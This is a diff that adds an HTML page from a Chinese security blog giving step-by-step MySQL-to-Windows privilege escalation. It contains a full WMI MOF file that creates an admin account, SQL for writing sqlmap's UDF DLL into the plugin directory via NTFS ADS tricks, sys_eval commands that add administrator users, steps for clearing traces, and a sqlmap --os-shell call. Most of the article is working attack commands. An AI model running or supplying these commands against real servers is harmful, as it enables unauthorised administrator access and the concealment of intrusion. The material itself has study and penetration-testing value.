@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="mysql提权1.MOF 提取利用条件1使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。  提权原理利用了c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行 基本步骤编写mof文件，必须命名为null">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLPrivilgeEscalation">
+<meta property="og:url" content="http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="mysql提权1.MOF 提取利用条件1使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。  提权原理利用了c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行 基本步骤编写mof文件，必须命名为null">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-09-27T05:35:53.039Z">
+<meta property="article:modified_time" content="2020-09-27T07:00:50.137Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SQLPrivilgeEscalation</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/09/27/NTFS-ADS/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/09/26/bWAPP-sqlmap/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&text=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&is_video=false&description=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQLPrivilgeEscalation&body=Check out this article: http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&title=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&name=SQLPrivilgeEscalation&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/09/27/SQLPrivilgeEscalation/&t=SQLPrivilgeEscalation" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql提权"><span class="toc-number">1.</span> <span class="toc-text">mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-MOF-提取"><span class="toc-number">1.1.</span> <span class="toc-text">1.MOF 提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权原理"><span class="toc-number">1.1.2.</span> <span class="toc-text">提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本步骤"><span class="toc-number">1.1.3.</span> <span class="toc-text">基本步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#编写mof文件，必须命名为nullevt-mof"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">编写mof文件，必须命名为nullevt.mof</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#上传到c-windows-system32-或c-winnt-目录"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">上传到c:\windows\system32(或c:\winnt\)目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程桌面连接"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">远程桌面连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-UDF提取"><span class="toc-number">1.2.</span> <span class="toc-text">2.UDF提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权方法"><span class="toc-number">1.2.2.</span> <span class="toc-text">提权方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本步骤-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">基本步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#udf-dll解码"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">udf.dll解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件导入"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">文件导入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#手工建立lib-plugin文件夹"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text">手工建立lib\plugin文件夹</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从udf文件中引入自定义函数"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">从udf文件中引入自定义函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行自定义函数"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">执行自定义函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程桌面连接-1"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">远程桌面连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#清除痕迹"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">清除痕迹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">1.2.4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-into-outfile-直接写入"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">1. into outfile 直接写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-表内容导出写入"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">2. 表内容导出写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-sqlmap写入UDF"><span class="toc-number">1.3.</span> <span class="toc-text">3.sqlmap写入UDF</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SQLPrivilgeEscalation
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-09-27T05:35:53.039Z" itemprop="datePublished">2020-09-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h2 id="1-MOF-提取"><a href="#1-MOF-提取" class="headerlink" title="1.MOF 提取"></a>1.MOF 提取</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>利用了<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p>
+<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="编写mof文件，必须命名为nullevt-mof"><a href="#编写mof文件，必须命名为nullevt-mof" class="headerlink" title="编写mof文件，必须命名为nullevt.mof"></a>编写mof文件，必须命名为nullevt.mof</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(<span class="string">"\\\\.\\root\\subscription"</span>)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">    Name  = <span class="string">"filtP2"</span>;</span><br><span class="line">    Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"</span>Win32_LocalTime\<span class="string">" "</span></span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">    QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">    ScriptText =</span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"</span>WScript.Shell\<span class="string">")\nWSH.run(\"</span>net.exe user admin admin.admin /add\<span class="string">")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    <span class="built_in">Filter</span> = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="上传到c-windows-system32-或c-winnt-目录"><a href="#上传到c-windows-system32-或c-winnt-目录" class="headerlink" title="上传到c:\windows\system32(或c:\winnt\)目录"></a>上传到c:\windows\system32(或c:\winnt\)目录</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'</span><br><span class="line"></span><br><span class="line"><span class="comment">--此处C:/wmpub/nullevt.mof为上次mof文件位置，可联合文件上传漏洞，在www目录下写入mof文件</span></span><br></pre></td></tr></table></figure>
+
+<p>此处<code>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin.admin /add\&quot;)</code>执行添加admin用户</p>
+<p>再次上传mof文件，把admin用户提权到管理员组（修改<code>var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators secist /add\&quot;)</code>）</p>
+<p>最终创建了管理员用户</p>
+<h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /admin</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-UDF提取"><a href="#2-UDF提取" class="headerlink" title="2.UDF提取"></a>2.UDF提取</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、其利用条件是目标系统是Windows(Win2000,XP,Win2003)；拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数,有root账号密码。</span><br><span class="line">2、Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</span><br><span class="line">3、Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</span><br><span class="line">4、掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。</span><br><span class="line"></span><br><span class="line">sqlmap里是有udf.dll文件的，就在sqlmap/udf/mysql/windows目录下，里面有32位和64位</span><br><span class="line">注意：这里的位数是mysql的位数，并不是对方系统的位数。sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本步骤-1"><a href="#基本步骤-1" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="udf-dll解码"><a href="#udf-dll解码" class="headerlink" title="udf.dll解码"></a>udf.dll解码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/sqlmap/extra/cloak/cloak.py  -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/share/sqlmap/extra/cloak/cloak.py自带的locak解码脚本</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 为sqlmap自带UDF文件路径</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">执行完成后会在/usr/share/sqlmap/data/udf/mysql/windows/64/文件夹下生成lib_mysqludf_sys.dll文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_eval，执行任意命令，并将输出返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_exec，执行任意命令，并将退出码返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_get，获取一个环境变量。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">sys_set，创建或修改一个环境变量。</span></span><br></pre></td></tr></table></figure>
+
+<p>并把lib_mysqludf_sys.dll文件上传到站点目录下，改名为udf.dll</p>
+<h4 id="文件导入"><a href="#文件导入" class="headerlink" title="文件导入"></a>文件导入</h4><p>MySQL&lt;5.0，导出路径随意；</p>
+<p>5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：c:/windows/system32/）</p>
+<p>MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
+<p>一般lib\plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）有webshell可以直接创建，没有的话使用 into dumpfile 写入</p>
+<h5 id="手工建立lib-plugin文件夹"><a href="#手工建立lib-plugin文件夹" class="headerlink" title="手工建立lib\plugin文件夹"></a>手工建立lib\plugin文件夹</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;  //查找到mysql的目录</span><br><span class="line"> </span><br><span class="line">mysql&gt; select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //利用NTFS ADS创建lib目录</span><br><span class="line"> </span><br><span class="line">mysql&gt; select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';    //利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.jianshu.com/p/7842ee248621" target="_blank" rel="noopener">NTFS ADS的前世今生</a></p>
+<h4 id="从udf文件中引入自定义函数"><a href="#从udf文件中引入自定义函数" class="headerlink" title="从udf文件中引入自定义函数"></a>从udf文件中引入自定义函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname 'udf.dll'; </span><br><span class="line"><span class="comment">--sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="执行自定义函数"><a href="#执行自定义函数" class="headerlink" title="执行自定义函数"></a>执行自定义函数</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval('net user admin admin /add'); </span><br><span class="line">mysql&gt; select sys_eval('net localgroup administrators admin /add');</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程桌面连接-1"><a href="#远程桌面连接-1" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop function sys_eval; --删除函数</span><br><span class="line">mysql&gt; delete from mysql.func where name='sys_eval' --删除函数</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>版本&gt;5.6.34 secure-file-priv需要为空才可以通过mysql传udf</strong></p>
+<h4 id="1-into-outfile-直接写入"><a href="#1-into-outfile-直接写入" class="headerlink" title="1. into outfile 直接写入"></a>1. into outfile 直接写入</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1.将udf的内容进行16进制编码 得到字符串 A</span></span><br><span class="line">hexdump lib_mysqludf_sys.dll</span><br><span class="line"><span class="comment">-- 2.写入文件</span></span><br><span class="line">mysql&gt; select A into outfile 'C:/Program Files/MySQL/MySQL Server 5.5/lib/plugin/udf.dll';</span><br><span class="line"><span class="comment">-- 3.创建sys_eval</span></span><br><span class="line">mysql&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';</span><br><span class="line"><span class="comment">-- 4.获取system执行权限</span></span><br><span class="line">mysql&gt; select sys_eval('whoami');</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-表内容导出写入"><a href="#2-表内容导出写入" class="headerlink" title="2. 表内容导出写入"></a>2. 表内容导出写入</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1.将udf的内容进行16进制编码 得到字符串 A</span></span><br><span class="line">hexdump lib_mysqludf_sys.dll</span><br><span class="line"><span class="comment">-- 2.建立表保存16进制内容</span></span><br><span class="line">mysql&gt; set @my_udf=concat('',A);</span><br><span class="line">mysql&gt; create table udf_data(data LONGBLOB);</span><br><span class="line"><span class="comment">--3.将my_udf的内容插入表udf_data中。</span></span><br><span class="line">mysql&gt; insert into udf_data values("");</span><br><span class="line">mysql&gt; update udf_data set data = @my_udf;</span><br><span class="line"><span class="comment">--4.将内容导出到文件。</span></span><br><span class="line">mysql&gt; select data from udf_data into DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.5/lib/plugin/udf.dll';</span><br><span class="line"><span class="comment">--5.执行系统命令</span></span><br><span class="line">mysql&gt; create function sys_eval returns string soname 'udf.dll';</span><br><span class="line">mysql&gt; select sys_eval('whoami');</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-sqlmap写入UDF"><a href="#3-sqlmap写入UDF" class="headerlink" title="3.sqlmap写入UDF"></a>3.sqlmap写入UDF</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -d "mysql://root:root@172.0.0.1:3306/mysql" <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/x728999452/article/details/52413974" target="_blank" rel="noopener">MySQL 利用UDF执行命令</a></p>
+<p><a href="https://www.cnblogs.com/h4ck0ne/p/5154604.html" target="_blank" rel="noopener">mof/udf提权</a></p>
+<p><a href="https://blog.csdn.net/weixin_45427650/article/details/104849928" target="_blank" rel="noopener">udf提取</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql提权"><span class="toc-number">1.</span> <span class="toc-text">mysql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-MOF-提取"><span class="toc-number">1.1.</span> <span class="toc-text">1.MOF 提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权原理"><span class="toc-number">1.1.2.</span> <span class="toc-text">提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本步骤"><span class="toc-number">1.1.3.</span> <span class="toc-text">基本步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#编写mof文件，必须命名为nullevt-mof"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">编写mof文件，必须命名为nullevt.mof</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#上传到c-windows-system32-或c-winnt-目录"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">上传到c:\windows\system32(或c:\winnt\)目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程桌面连接"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">远程桌面连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-UDF提取"><span class="toc-number">1.2.</span> <span class="toc-text">2.UDF提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权方法"><span class="toc-number">1.2.2.</span> <span class="toc-text">提权方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本步骤-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">基本步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#udf-dll解码"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">udf.dll解码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件导入"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">文件导入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#手工建立lib-plugin文件夹"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text">手工建立lib\plugin文件夹</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从udf文件中引入自定义函数"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">从udf文件中引入自定义函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行自定义函数"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">执行自定义函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程桌面连接-1"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">远程桌面连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#清除痕迹"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">清除痕迹</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他"><span class="toc-number">1.2.4.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li 